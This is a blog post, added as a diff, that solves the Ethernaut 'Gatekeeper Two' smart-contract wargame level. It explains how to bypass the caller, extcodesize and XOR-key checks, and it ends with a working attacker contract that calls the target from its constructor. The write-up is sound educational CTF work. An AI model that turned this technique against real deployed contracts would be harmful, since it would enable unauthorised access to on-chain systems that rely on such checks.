@@ -1,0 +1,100 @@
+---
+title: Ethernaut - Gatekeeper Two - Solution
+date: '2024-05-31'
+tags: ['security', 'solidity', 'ctfs']
+draft: false
+summary: Solution to the Ethernaut - Gatekeeper Two CTF
+---
+
+# Ethernaut - Gatekeeper Two - Solution
+
+## Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract GatekeeperTwo {
+    address public entrant;
+
+    modifier gateOne() {
+        require(msg.sender != tx.origin);
+        _;
+    }
+
+    modifier gateTwo() {
+        uint256 x;
+        assembly {
+            x := extcodesize(caller())
+        }
+        require(x == 0);
+        _;
+    }
+
+    modifier gateThree(bytes8 _gateKey) {
+        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
+        _;
+    }
+
+    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+        entrant = tx.origin;
+        return true;
+    }
+}
+```
+
+## Solution
+
+The goal of this level is to register yourself as an `entrant`.
+
+To pass `gateOne()`, we need to call `enter()` from a contract rather than from our EOA.
+At first sight, this looks like a direct contradiction to the second gate since `gateTwo()` requires `extcodesize(caller())` to equal zero.
+However, section 7.1 of the [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf) tells us that _"while the initialisation code is executing, the newly created address exists but with no intrinsic body code."_
+In other words, if we call `enter()` in the constructor of a contract, `gateTwo()` will determine that the `extcodesize()` of that contract is zero.
+
+To understand how we can pass `gateThree()`, let's take a closer look at the corresponding `require` statement.
+Our goal is to pass a `bytes8 _gateKey` such that the left-hand side (LHS) becomes `type(uint64).max`, i.e., the largest 64-bit unsigned integer.
+Here is what this number looks like in different integer representations:
+
+    - Decimal positional system: 18446744073709551615
+    - Binary positional system: 1111111111111111111111111111111111111111111111111111111111111111
+    - Hexadecimal positional system: 0xffffffffffffffff
+
+_Note: If you're not familiar with integer representations, section 3.2.5 of [The MoonMath Manual](https://github.com/LeastAuthority/moonmath-manual?tab=readme-ov-file) is a great introduction to the topic._
+
+Taking a closer look at the LHS, the first important thing to notice is that `msg.sender` will be the address of the calling contract.
+Without loss of generality, let's assume this address is 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 so that we can compute a concrete example of the first operand on the LHS via [Chisel](https://book.getfoundry.sh/chisel/):
+
+```
+➜ uint64(bytes8(keccak256(abi.encodePacked(myAddress))))
+Type: uint64
+├ Hex: 0x5931b4ed56ace4c4
+├ Hex (full word): 0x0000000000000000000000000000000000000000000000005931b4ed56ace4c4
+└ Decimal: 6427117074688828612
+```
+
+The binary representation of this number is 0101100100110001101101001110110101010110101011001110010011000100.
+In order for the `^` (XOR) operation to yield the largest 64-bit unsigned integer, 111...111, the second operand needs to be the [bitwise NOT](https://en.wikipedia.org/wiki/Bitwise_operation#NOT) of the first operand.
+In Solidity, the bitwise NOT can be applied via `~`.
+
+As a conclusion, we can solve the level by deploying the following contract, specifying our level-instance address as the `victim`:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IGatekeeperTwo {
+    function enter(bytes8 gateKey) external returns (bool);
+}
+
+contract GatekeeperTwoAttacker {
+    IGatekeeperTwo public immutable VICTIM;
+
+    constructor(address victim) {
+        VICTIM = IGatekeeperTwo(victim);
+        VICTIM.enter(~bytes8(keccak256(abi.encodePacked(address(this)))));
+    }
+}
+```
+
+ 
